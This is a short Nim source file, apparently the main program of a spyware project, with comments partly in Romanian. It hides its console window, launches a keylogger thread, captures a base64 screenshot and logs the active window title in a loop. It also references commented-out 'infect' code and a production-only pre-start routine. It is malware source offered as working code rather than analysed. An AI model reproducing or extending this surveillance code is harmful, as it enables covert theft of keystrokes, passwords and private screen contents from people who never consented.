# hide the console window
const isProd {.booldefine.}: bool = false


# am pus asta doar ca sa testez func
# import lib/functions/infect
# infect()

when isProd:
  from lib/functions/beforeStart import run
  run()

import asyncdispatch
import lib/threads/keyloggerThread
import lib/functions/getWindowName
import lib/functions/screenshot
let base64Ss: string = screenshot()

# writeFile("base64.tmp.txt", base64Ss)

## TODO: CODE CLEANUP
## TODO: COMUNICARE INTRE THREADURI
var thr: Thread[void]

createThread(thr, initKeyloggerThread)

proc main() {.async.} =
  echo getWindowName()
  await sleepAsync(1000)
  asyncCheck main()

asyncCheck main()

runForever()

